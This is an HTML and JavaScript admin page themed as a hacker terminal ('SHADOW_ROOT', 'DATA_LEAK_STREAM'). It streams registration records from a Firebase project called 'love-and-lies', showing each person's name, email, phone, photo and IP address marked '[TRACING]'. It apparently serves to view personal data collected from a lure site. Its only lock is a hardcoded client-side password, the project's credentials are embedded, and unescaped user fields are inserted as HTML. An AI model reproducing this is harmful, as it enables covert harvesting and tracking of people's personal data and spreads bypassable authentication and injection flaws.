<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>S H A D O W _ R O O T | Terminal</title>
    <script src="https://unpkg.com/lucide@latest"></script>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --terminal-green: #00ff41;
            --dark-bg: #0a0a0a;
            --warning-red: #ff0000;
            --low-white: #a0a0a0;
            --crt-glow: rgba(0, 255, 65, 0.2);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Fira Code', monospace;
        }

        body {
            background-color: var(--dark-bg);
            color: var(--terminal-green);
            min-height: 100vh;
            overflow-x: hidden;
            text-transform: uppercase;
        }

        body::before {
            content: " ";
            display: block;
            position: fixed;
            top: 0; left: 0; bottom: 0; right: 0;
            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), 
                        linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
            z-index: 5000;
            background-size: 100% 4px, 3px 100%;
            pointer-events: none;
        }

        #adminLock {
            position: fixed;
            inset: 0;
            background: black;
            z-index: 9999;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .lock-box {
            border: 1px solid var(--terminal-green);
            padding: 40px;
            box-shadow: 0 0 20px var(--crt-glow);
            max-width: 500px;
            width: 100%;
        }

        .glitch-text { font-weight: bold; font-size: 1.5rem; margin-bottom: 20px; letter-spacing: 2px; }

        .lock-input {
            width: 100%;
            background: transparent;
            border: none;
            border-bottom: 2px solid var(--terminal-green);
            padding: 10px 0;
            color: var(--terminal-green);
            font-size: 1.2rem;
            outline: none;
            margin-bottom: 20px;
        }

        .lock-btn {
            background: var(--terminal-green);
            color: black;
            border: none;
            padding: 10px 20px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
        }

        #adminContent { display: none; }

        nav {
            border-bottom: 1px solid var(--terminal-green);
            padding: 15px 40px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: rgba(0,0,0,0.9);
        }

        .container { max-width: 1300px; margin: 0 auto; padding: 40px 20px; }

        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
            gap: 20px;
        }

        .data-node {
            border: 1px solid var(--terminal-green);
            background: rgba(0, 255, 65, 0.02);
            padding: 20px;
            position: relative;
        }

        .node-header {
            font-size: 0.7rem;
            border-bottom: 1px solid rgba(0, 255, 65, 0.3);
            margin-bottom: 15px;
            padding-bottom: 5px;
            display: flex;
            justify-content: space-between;
        }

        .field-label { color: var(--low-white); font-size: 0.6rem; margin-top: 10px;}
        .field-value { font-size: 0.9rem; color: #fff; }
        .handle { color: var(--terminal-green); font-size: 1.1rem; font-weight: bold; }

        .ip-box {
            background: rgba(0, 255, 65, 0.1);
            border: 1px dashed var(--terminal-green);
            padding: 10px;
            margin: 15px 0;
        }

        .purge-btn {
            background: transparent;
            border: 1px solid var(--warning-red);
            color: var(--warning-red);
            font-size: 0.6rem;
            padding: 4px 8px;
            cursor: pointer;
            margin-top: 15px;
        }

        .status-bar {
            position: fixed;
            bottom: 0; width: 100%;
            background: var(--terminal-green);
            color: black;
            font-size: 0.7rem;
            padding: 3px 20px;
            display: flex;
            justify-content: space-between;
        }

        .cursor { display: inline-block; width: 10px; height: 18px; background: var(--terminal-green); animation: blink 1s infinite; vertical-align: middle; }
        @keyframes blink { 50% { opacity: 0; } }
    </style>
</head>

<body>

    <div id="adminLock">
        <div class="lock-box">
            <h1 class="glitch-text">SHADOW_ROOT LOGIN</h1>
            <input type="password" id="adminPass" class="lock-input" placeholder="ACCESS_KEY">
            <button id="unlockBtn" class="lock-btn">DECRYPT_DATA</button>
            <p id="error-hint" style="display:none; color:red; font-size:0.7rem; margin-top:10px;">AUTH_FAILURE</p>
        </div>
    </div>

    <div id="adminContent">
        <nav>
            <span class="logo">S H A D O W _ R O O T</span>
            <button onclick="logoutAdmin()" style="background:none; border:1px solid var(--terminal-green); color:var(--terminal-green); padding:2px 10px; cursor:pointer;">BYE</button>
        </nav>

        <div class="container">
            <h1 style="font-size: 2rem; margin-bottom: 30px;">DATA_LEAK_STREAM<span class="cursor"></span></h1>
            <div id="loader" style="text-align:center;">SYNCING...</div>
            <div class="grid" id="dataGrid"></div>
        </div>

        <div class="status-bar">
            <span>BITCOIN_WALLET: ACTIVE</span>
            <span>NODES: 12_ONLINE</span>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
        import { getFirestore, collection, onSnapshot, query, orderBy, doc, deleteDoc } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyC4yQEux_k2SUv1_VnO01nEUa6OmtfhfOs",
            authDomain: "love-and-lies.firebaseapp.com",
            projectId: "love-and-lies",
            storageBucket: "love-and-lies.firebasestorage.app",
            messagingSenderId: "131638687012",
            appId: "1:131638687012:web:13545ed4025dcd1df9afb1"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        const ADMIN_KEY = "ADMIN@LOVE2026"; 
        const lockScreen = document.getElementById('adminLock');
        const contentScreen = document.getElementById('adminContent');
        const passInput = document.getElementById('adminPass');

        if (sessionStorage.getItem('shadowAuth') === 'true') { unlockTerminal(); }

        function unlockTerminal() {
            lockScreen.style.display = 'none';
            contentScreen.style.display = 'block';
            startDataStream();
        }

        window.logoutAdmin = () => { sessionStorage.removeItem('shadowAuth'); location.reload(); }

        document.getElementById('unlockBtn').addEventListener('click', () => {
            if (passInput.value === ADMIN_KEY) {
                sessionStorage.setItem('shadowAuth', 'true');
                unlockTerminal();
            } else {
                document.getElementById('error-hint').style.display = 'block';
            }
        });

        function startDataStream() {
            const dataGrid = document.getElementById('dataGrid');
            const q = query(collection(db, "registrations"), orderBy("createdAt", "desc"));

            onSnapshot(q, (snapshot) => {
                document.getElementById('loader').style.display = 'none';
                dataGrid.innerHTML = '';
                snapshot.forEach((snapshotDoc) => {
                    const data = snapshotDoc.data();
                    const date = data.createdAt ? data.createdAt.toDate().toLocaleString() : 'PENDING';
                    const node = document.createElement('div');
                    node.className = 'data-node';

                    let avatar = data.photoURL ? `<img src="${data.photoURL}" style="width: 40px; height: 40px; border: 1px solid var(--terminal-green); filter: grayscale(1);">` : `[?]`;

                    node.innerHTML = `
                        <div class="node-header"><span>ID: ${snapshotDoc.id.substring(0,8)}</span><span style="color:red;">[TRACING]</span></div>
                        <div style="display:flex; gap:10px; align-items:center;">
                            ${avatar}
                            <div><p class="field-label">HANDLE</p><p class="handle">@${data.username}</p></div>
                        </div>
                        <div class="ip-box">
                            <p class="field-label" style="margin:0;">IPV4_SOURCE</p>
                            <p class="field-value" style="color:var(--terminal-green); font-weight:bold;">${data.ipAddress || '0.0.0.0'}</p>
                        </div>
                        <p class="field-label">NAME</p><p class="field-value">${data.fullName}</p>
                        <p class="field-label">EMAIL</p><p class="field-value">${data.email}</p>
                        <p class="field-label">PHONE</p><p class="field-value">${data.phone}</p>
                        <p class="field-label">STAMP</p><p class="field-value">${date}</p>
                        <button class="purge-btn" data-id="${snapshotDoc.id}">[ PURGE_RECORD ]</button>
                    `;
                    dataGrid.appendChild(node);
                });
            });

            dataGrid.addEventListener('click', async (e) => {
                const btn = e.target.closest('.purge-btn');
                if (btn && confirm("ERASE PERMANENTLY?")) {
                    await deleteDoc(doc(db, "registrations", btn.dataset.id));
                }
            });
        }
    </script>
</body>
</html>
